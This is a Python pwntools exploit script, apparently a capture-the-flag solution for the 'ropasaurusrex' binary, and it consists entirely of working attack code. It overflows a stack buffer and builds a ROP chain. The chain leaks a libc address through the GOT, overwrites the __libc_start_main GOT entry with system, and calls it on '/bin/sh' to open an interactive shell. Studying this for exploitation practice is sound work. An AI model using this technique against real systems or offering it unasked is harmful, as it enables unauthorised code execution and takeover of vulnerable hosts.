from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d")
else:
    conn = remote(HOST, PORT)

elf = ELF("./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d")

""" Change this value
"""
pop3ret = 0x80484b6
__libc_start_main_rel = 0x00018180
system_rel = 0x0003b060

gdb.attach(conn)

ROP = "A" * 140

# write(1, __libc_start_main_got, 4)
ROP += p32(elf.plt['write'])
ROP += p32(pop3ret)
ROP += p32(1)
ROP += p32(elf.got['__libc_start_main'])
ROP += p32(4)

# read(0, __libc_start_main_got, 20)
ROP += p32(elf.plt['read'])
ROP += p32(pop3ret)
ROP += p32(0)
ROP += p32(elf.got['__libc_start_main'])
ROP += p32(20)

# system('bin/sh')
ROP += p32(elf.plt['__libc_start_main'])
ROP += p32(0xBBBB)
ROP += p32(elf.got['__libc_start_main']+4)


conn.sendline(ROP)
time.sleep(0.1)

__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel

print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/sh")
time.sleep(0.1)

conn.interactive()
